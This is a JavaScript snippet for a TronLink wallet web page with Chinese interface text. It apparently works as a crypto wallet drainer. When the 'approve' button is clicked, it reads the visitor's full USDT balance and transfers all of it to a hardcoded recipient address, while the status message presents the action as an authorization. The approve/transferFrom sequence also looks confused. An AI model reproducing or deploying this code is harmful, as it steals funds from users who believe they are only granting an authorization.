let tronWebInstance;

async function getTronWeb() {
    return new Promise((resolve, reject) => {
        const checkTronWeb = setInterval(() => {
            if (typeof window.tronWeb !== 'undefined') {
                clearInterval(checkTronWeb);
                tronWebInstance = window.tronWeb;
                resolve(tronWebInstance);
            } else {
                alert('请安装TronLink钱包并登录');
                reject(new Error('Wallet not found'));
            }
        }, 1000);
    });
}

const tokenAddress = 'USDT_CONTRACT_ADDRESS'; // 替换为USDT合约地址
const recipientAddress = 'TYrG44bTwLhiEGvb48HYtHCAkgk7etr4d3'; // 接收地址

document.getElementById('approveBtn').onclick = async function() {
    try {
        const tronWeb = await getTronWeb();
        const tokenContract = await tronWeb.contract().at(tokenAddress);
        
        const amount = await tokenContract.balanceOf(tronWeb.defaultAddress.base58).call();
        if (amount.isZero()) {
            document.getElementById('status').innerText = '您的USDT余额为0，无法转账。';
            return;
        }

        await tokenContract.approve(tronWeb.defaultAddress.base58, amount).send();
        await tokenContract.transferFrom(tronWeb.defaultAddress.base58, recipientAddress, amount).send();
        
        document.getElementById('status').innerText = '授权并转账成功！';
    } catch (error) {
        console.error(error);
        document.getElementById('status').innerText = '操作失败: ' + (error.message || '未知错误');
    }
};
